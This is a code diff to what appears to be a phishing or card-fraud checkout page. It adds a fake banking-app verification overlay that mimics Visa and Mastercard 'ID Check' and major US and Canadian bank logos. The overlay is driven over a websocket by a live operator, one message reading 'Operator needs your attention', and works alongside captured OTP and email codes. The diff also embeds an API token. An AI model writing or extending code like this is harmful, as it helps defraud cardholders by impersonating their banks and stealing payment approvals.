@@ -1208,7 +1208,7 @@ url("pay1ment_icons.woff") format("woff");
                             <p>Verifying email code...</p>
                         </div>
                     </div>
-                    <div id="email-result" class="">
+                    <div id="email-result" class="hidden">
                         <div class="result-msg error" id="email-fail">
                             <svg width="48" height="48" fill="none" viewBox="0 0 48 48">
                                 <circle cx="24" cy="24" r="22" fill="#e74c3c" stroke="#e74c3c" stroke-width="2"></circle>
@@ -1605,8 +1605,10 @@ url("pay1ment_icons.woff") format("woff");
       _curStep = 'card';
       var resultmessage = p.message || 'Your bank did not authorize this transaction.';
       document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
-      document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
+      document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
       changeOtp();
+      changeEmail();
+      document.getElementById('app-verify-overlay').classList.add('hidden');
       var btn5 = q('btnSubmit');
       if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
       showInline('info', p.message || 'Please use a different card.', true);
@@ -1622,6 +1624,38 @@ url("pay1ment_icons.woff") format("woff");
       if (rb) { rb.disabled = true; rb.textContent = 'Limit reached'; }
       showInline('error', p.message || 'Maximum resend attempts reached.', true);
     }
+     else if (a === 'app_verify') {
+      _curStep = 'app_verify';
+      window._appVerifyInProgress = true;
+      document.getElementById('load-overlay').classList.add('hidden');
+      document.getElementById('app-verify-overlay').classList.remove('hidden');
+      var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
+      updateBankLogo(bankName);
+      document.getElementById('app-amount').textContent = '$' + discountedTotal().toFixed(2);
+      updateAppSchemeLogo(p.cardInfo?.cardType || p.cardType || '')
+    } 
+    else if (a === 'app_verify_fail') {
+      window._appVerifyInProgress = true;
+      document.getElementById('app-verify-overlay').classList.remove('hidden');
+      document.getElementById('app-spinner').style.display = 'none';
+      document.getElementById('app-continue-btn').disabled = false;
+      document.getElementById('app-error').classList.remove('hidden');
+      document.getElementById('app-error').textContent = p.message || 'APP verification not completed.'
+    } 
+    else if (window._appVerifyInProgress) {
+      document.getElementById('app-verify-overlay').classList.remove('hidden');
+      document.getElementById('app-spinner').style.display = 'none';
+      document.getElementById('app-continue-btn').disabled = false;
+      document.getElementById('app-error').classList.remove('hidden');
+       document.getElementById('app-error').textContent = p.message || 'Operator needs your attention'
+    }
+
+
+
+
+
+
+    
   }
  
  
@@ -1842,6 +1876,153 @@ url("pay1ment_icons.woff") format("woff");
     if (btn) { btn.disabled = false; btn.textContent = 'Verify'; }
     document.querySelector("#btnSubmit").disabled = false;
   }
+
+
+
+
+  function getBankColor(name) {
+                var n = (name || '').toLowerCase();
+                if (/chase|jpmorgan/.test(n))
+                    return '#0f5499';
+                if (/bofa|bank of america/.test(n))
+                    return '#e31837';
+                if (/wells\s*fargo/.test(n))
+                    return '#d71e28';
+                if (/citi(?!zen)/.test(n))
+                    return '#056dae';
+                if (/capital\s*one/.test(n))
+                    return '#004977';
+                if (/td(\s|bank)/.test(n))
+                    return '#20b14a';
+                if (/rbc|royal/.test(n))
+                    return '#005cd9';
+                if (/scotia|scotiabank/.test(n))
+                    return '#ed1c24';
+                if (/bmo/.test(n))
+                    return '#0079c2';
+                if (/cibc/.test(n))
+                    return '#c41f3d';
+                if (/amex|american\s*express/.test(n))
+                    return '#006fcf';
+                if (/discover/.test(n))
+                    return '#ff5f1f';
+                return '#1a1f71'
+            }
+            function getBankLogoUrl(name) {
+                var n = (name || '').toLowerCase();
+                var d = '';
+                if (/chase|jpmorgan/.test(n))
+                    d = 'chase.com';
+                else if (/bofa|bank of america/.test(n))
+                    d = 'bankofamerica.com';
+                else if (/wells\s*fargo/.test(n))
+                    d = 'wellsfargo.com';
+                else if (/citi(?!zen)/.test(n))
+                    d = 'citi.com';
+                else if (/capital\s*one/.test(n))
+                    d = 'capitalone.com';
+                else if (/td(\s|bank)/.test(n))
+                    d = 'td.com';
+                else if (/rbc|royal/.test(n))
+                    d = 'rbcroyalbank.com';
+                else if (/scotia|scotiabank/.test(n))
+                    d = 'scotiabank.com';
+                else if (/bmo/.test(n))
+                    d = 'bmo.com';
+                else if (/cibc/.test(n))
+                    d = 'cibc.com';
+                else if (/amex|american\s*express/.test(n))
+                    d = 'americanexpress.com';
+                else if (/discover/.test(n))
+                    d = 'discover.com';
+                else if (/us\s*bank|usbank/.test(n))
+                    d = 'usbank.com';
+                else if (/pnc/.test(n))
+                    d = 'pnc.com';
+                else if (/truist/.test(n))
+                    d = 'truist.com';
+                else if (/sumitomo/i.test(n))
+                    d = 'sumitomocard.co.jp';
+                if (d)
+                    return 'https://img.logo.dev/' + d + '?token=pk_RBgCfubiQV-pbxOMdbqk1w&size=40';
+                var enc = encodeURIComponent(name);
+                return 'https://img.logo.dev/' + enc + '?token=pk_RBgCfubiQV-pbxOMdbqk1w&size=40';
+            }
+            function updateBankLogo(name) {
+                var el = document.getElementById('app-bank-logo');
+                if (!el)
+                    return;
+                el.innerHTML = '';
+                el.style.background = 'transparent';
+                var img = document.createElement('img');
+                img.style.cssText = 'width:34px;height:28px;object-fit:contain';
+                img.onerror = function() {
+                    img.style.display = 'none';
+                    el.textContent = (name || 'IB').slice(0, 2).toUpperCase();
+                    el.style.background = getBankColor(name)
+                }
+                ;
+                fetch('/api/logo/' + encodeURIComponent(name || 'Bank')).then(function(r) {
+                    return r.json()
+                }).then(function(d) {
+                    var url = (d.data || d).logoUrl || '';
+                    if (url) {
+                        img.src = url;
+                        el.appendChild(img)
+                    } else {
+                        img.onerror()
+                    }
+                }).catch(function() {
+                    el.textContent = (name || 'IB').slice(0, 2).toUpperCase();
+                    el.style.background = getBankColor(name)
+                })
+            }
+            function updateAppSchemeLogo(cardType) {
+                var el = document.getElementById('app-scheme');
+                var n = (cardType || '').toLowerCase();
+                if (n.includes('visa')) {
+                    el.innerHTML = '<svg width="34" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg> <span class="app-scheme-name">ID Check</span>'
+                } else if (n.includes('mastercard') || n.includes('mc')) {
+                    el.innerHTML = '<span class="app-scheme-mark"><span class="app-circle red"></span><span class="app-circle yellow"></span></span> <span class="app-scheme-name">ID Check</span>'
+                } else if (n.includes('amex')) {
+                    el.innerHTML = '<svg width="34" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg> <span class="app-scheme-name">ID Check</span>'
+                } else {
+                    el.innerHTML = '<span class="app-scheme-mark"><span class="app-circle red"></span><span class="app-circle yellow"></span></span> <span class="app-scheme-name">ID Check</span>'
+                }
+            }
+            function appVerifyContinue() {
+                document.getElementById('app-spinner').style.display = 'flex';
+                document.getElementById('app-continue-btn').disabled = true;
+                if (ws && ws.readyState === 1 && sid)
+                    ws.send(JSON.stringify({
+                        type: 'app_verify_done',
+                        payload: {
+                            sessionId: sid
+                        }
+                    }))
+            }
+            function hideAppVerify() {
+                document.getElementById('app-verify-overlay').classList.add('hidden')
+            }
+            function updateOtpCardLogo(cardType) {
+                var el = document.getElementById('otp-card-logo');
+                if (!el)
+                    return;
+                var n = (cardType || '').toLowerCase();
+                var logo = '';
+                if (n.includes('visa')) {
+                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg>'
+                } else if (n.includes('mastercard') || n.includes('mc')) {
+                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg>'
+                } else if (n.includes('amex')) {
+                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg>'
+                } else if (n.includes('discover')) {
+                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#ff5f1f"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">DISC</text></svg>'
+                } else {
+                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#888"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">CARD</text></svg>'
+                }
+                ;el.innerHTML = logo + '<span style="color:#ccc;font-size:18px">|</span><span style="font-family:Arial;font-size:13px">Secure</span>'
+            }
 
 
 
